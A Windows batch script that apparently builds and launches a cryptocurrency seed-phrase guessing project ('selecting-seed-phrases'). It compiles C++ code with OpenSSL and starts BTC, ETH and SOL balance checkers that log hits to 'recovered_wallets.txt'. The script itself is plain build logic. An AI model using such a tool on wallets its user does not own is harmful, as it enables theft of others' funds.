@echo off
setlocal

REM Run from repository root.
cd /d "%~dp0"

set "CMAKE_EXTRA_ARGS="
set "VCPKG_EFFECTIVE_ROOT="
set "PYTHON_BIN=python"

if exist "vcpkg.json" (
  powershell -NoProfile -ExecutionPolicy Bypass -Command "try { Get-Content -Raw -Path '.\vcpkg.json' | ConvertFrom-Json | Out-Null; exit 0 } catch { exit 1 }"
  if errorlevel 1 (
    echo.
    echo Detected invalid vcpkg.json in repository root.
    echo It looks like the file is not valid JSON ^(for example, a pasted PowerShell command^).
    echo.
    echo Repair with:
    echo   powershell -NoProfile -ExecutionPolicy Bypass -Command "$json = @{ name='selecting-seed-phrases'; 'version-string'='0.1.0'; dependencies=@('openssl') } ^| ConvertTo-Json -Depth 5; [System.IO.File]::WriteAllText('.\vcpkg.json', $json, (New-Object System.Text.UTF8Encoding($false)))"
    echo.
    goto :error
  )
)

REM Prefer local ./vcpkg inside this repo if it exists.
if exist "%cd%\vcpkg\scripts\buildsystems\vcpkg.cmake" (
  set "VCPKG_EFFECTIVE_ROOT=%cd%\vcpkg"
) else if defined VCPKG_ROOT (
  if exist "%VCPKG_ROOT%\scripts\buildsystems\vcpkg.cmake" (
    set "VCPKG_EFFECTIVE_ROOT=%VCPKG_ROOT%"
  )
)

if defined VCPKG_EFFECTIVE_ROOT (
  set "CMAKE_EXTRA_ARGS=%CMAKE_EXTRA_ARGS% -DCMAKE_TOOLCHAIN_FILE=%VCPKG_EFFECTIVE_ROOT%/scripts/buildsystems/vcpkg.cmake -DVCPKG_TARGET_TRIPLET=x64-windows"
)

if defined OPENSSL_ROOT_DIR (
  set "CMAKE_EXTRA_ARGS=%CMAKE_EXTRA_ARGS% -DOPENSSL_ROOT_DIR=%OPENSSL_ROOT_DIR%"
)

where py >nul 2>&1
if not errorlevel 1 (
  set "PYTHON_BIN=py -3"
)

echo [1/3] Configuring CMake...
cmake -S . -B build %CMAKE_EXTRA_ARGS%
if errorlevel 1 (
  echo.
  echo OpenSSL not found.
  echo.
  echo Option 1 ^(recommended^):
  echo   1^) Install vcpkg and package: openssl:x64-windows
  echo   2^) put vcpkg near this repo in .\vcpkg OR run: setx VCPKG_ROOT C:\path\to\vcpkg
  echo   3^) Install package: %%VCPKG_ROOT%%\vcpkg install openssl:x64-windows
  echo   4^) Re-open terminal and run this script again
  echo.
  echo Option 2:
  echo   setx OPENSSL_ROOT_DIR C:\path\to\openssl
  echo   Re-open terminal and run this script again
  goto :error
)

echo [2/3] Building project...
cmake --build build --config Release
if errorlevel 1 goto :error

echo [3/3] Starting 3 manual checker consoles ^(BTC/ETH/SOL^) via Python...
if not exist recovered_wallets.txt (
  type nul > recovered_wallets.txt
)

if not exist data (
  mkdir data
)

if not exist data\manual_wallets_btc.txt (
  > data\manual_wallets_btc.txt echo # Format: chain,address
  >>data\manual_wallets_btc.txt echo # btc,1BoatSLRHtKNngkdXEeobR76b53LETtpyT
  echo Created data\manual_wallets_btc.txt example file.
)

if not exist data\manual_wallets_eth.txt (
  > data\manual_wallets_eth.txt echo # Format: chain,address
  >>data\manual_wallets_eth.txt echo # eth,0xde0B295669a9FD93d5F28D9Ec85E40f4cb697BAe
  echo Created data\manual_wallets_eth.txt example file.
)

if not exist data\manual_wallets_sol.txt (
  > data\manual_wallets_sol.txt echo # Format: chain,address
  >>data\manual_wallets_sol.txt echo # sol,Vote111111111111111111111111111111111111111
  echo Created data\manual_wallets_sol.txt example file.
)

start "Manual BTC checker" cmd /k "%PYTHON_BIN% scripts\check_wallet_balances.py --manual-wallets data\manual_wallets_btc.txt --output recovered_wallets.txt --delay-seconds 0.2"
start "Manual ETH checker" cmd /k "%PYTHON_BIN% scripts\check_wallet_balances.py --manual-wallets data\manual_wallets_eth.txt --output recovered_wallets.txt --delay-seconds 0.2"
start "Manual SOL checker" cmd /k "%PYTHON_BIN% scripts\check_wallet_balances.py --manual-wallets data\manual_wallets_sol.txt --output recovered_wallets.txt --delay-seconds 0.2"

echo.
echo Started 3 manual checker consoles:
echo   - BTC from data\manual_wallets_btc.txt
echo   - ETH from data\manual_wallets_eth.txt
echo   - SOL from data\manual_wallets_sol.txt
goto :end

:error
echo.
echo Failed with error code %errorlevel%.

:end
pause
endlocal
